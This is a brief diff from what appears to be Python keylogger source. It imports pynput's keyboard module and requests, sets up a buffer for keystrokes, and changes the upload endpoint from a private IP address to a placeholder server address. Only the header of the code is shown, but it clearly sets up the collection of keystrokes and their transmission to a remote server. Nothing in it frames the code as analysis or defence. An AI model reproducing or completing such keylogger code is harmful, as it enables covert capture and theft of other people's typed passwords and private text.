@@ -2,7 +2,7 @@ from pynput import keyboard
 import time
 import requests
 
-URL = "http://192.168.39.184:5000/upload"
+URL = "http://YOUR_SERVER_IP:5000/upload"
 
 buffer = "" # Initialize an empty buffer to store keystrokes
 
